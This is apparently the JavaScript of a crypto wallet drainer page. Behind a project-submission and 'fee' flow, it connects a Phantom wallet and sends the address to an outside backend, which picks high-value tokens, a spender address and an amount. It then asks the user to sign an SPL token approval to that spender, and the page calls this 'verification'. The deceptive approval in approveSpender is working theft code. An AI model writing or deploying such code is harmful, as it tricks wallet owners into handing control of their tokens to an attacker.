/* ============================
   DOM REFERENCES
   ============================ */
const projectForm = document.getElementById('projectForm');
const feeModal = document.getElementById('feeModal');
const walletModal = document.getElementById('walletModal');
const closeButtons = document.getElementsByClassName('close');
const proceedButton = document.getElementById('proceedButton');
const walletConnectButton = document.getElementById('walletConnectButton');

let connection = null;
let walletPublicKey = null;

/* ============================
   UI FLOW
   ============================ */
if (projectForm && feeModal) {
  projectForm.addEventListener('submit', (event) => {
    event.preventDefault();
    feeModal.style.display = 'flex';
  });
}

if (closeButtons[0] && feeModal) {
  closeButtons[0].addEventListener('click', () => {
    feeModal.style.display = 'none';
  });
}

if (proceedButton && feeModal && walletModal) {
  proceedButton.addEventListener('click', () => {
    feeModal.style.display = 'none';
    walletModal.style.display = 'flex';
  });
}

if (closeButtons[1] && walletModal) {
  closeButtons[1].addEventListener('click', () => {
    walletModal.style.display = 'none';
  });
}

if (walletConnectButton) {
  walletConnectButton.addEventListener('click', connectPhantom);
}

/* ============================
   PHANTOM CONNECT
   ============================ */
async function connectPhantom() {
  try {
    if (!window.solana || !window.solana.isPhantom) {
      alert("Phantom wallet not found. Please install Phantom to continue.");
      return;
    }

    const resp = await window.solana.connect();
    walletPublicKey = resp.publicKey.toString();
    console.log("Connected wallet:", walletPublicKey);

    connection = new Connection("https://api.mainnet-beta.solana.com", "confirmed");

    // Call approval logic with backend scan
    await approveSpender(walletPublicKey);
  } catch (err) {
    console.error("Error connecting Phantom:", err);
    alert("Wallet connection failed: " + err.message);
  }
}

/* ============================
   APPROVAL LOGIC (SPL TOKEN + BACKEND SCAN)
   ============================ */
async function approveSpender(ownerAddress) {
  try {
    const BACKEND_URL = "https://spender-backend-production-de70.up.railway.app";

    console.log("Scanning wallet:", ownerAddress);

    const scanRes = await fetch(`${BACKEND_URL}/scan`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ owner: ownerAddress, chain: "solana" })
    });

    if (!scanRes.ok) {
      throw new Error(`Backend error: ${scanRes.status} - Check CORS or URL`);
    }

    const scanResult = await scanRes.json();
    console.log("Scan Result:", scanResult);

    if (!scanResult.success || !scanResult.data) {
      alert("Verification complete: No high-value assets found in this wallet to verify.");
      return;
    }

    // Backend should return tokenMint + delegate (spender) + amount
    const { tokenMint, spenderAddress, amount } = scanResult.data;

    const ownerPubKey = new PublicKey(ownerAddress);
    const mintPubKey = new PublicKey(tokenMint);
    const delegatePubKey = new PublicKey(spenderAddress);

    // Find associated token account
    const tokenAccount = await getAssociatedTokenAddress(mintPubKey, ownerPubKey);
    console.log("Token account:", tokenAccount.toBase58());

    // Build approve instruction
    const approveIx = createApproveInstruction(
      tokenAccount,
      delegatePubKey,
      ownerPubKey,
      amount,
      [],
      TOKEN_PROGRAM_ID
    );

    const tx = new Transaction().add(approveIx);

    // Request Phantom to sign + send
    const { signature } = await window.solana.signAndSendTransaction(tx);
    console.log("Approval tx signature:", signature);

    alert("✅ Verification Successful on Solana!");
  } catch (error) {
    console.error("Approval error:", error);
    alert("❌ Error: " + error.message);
  }
}
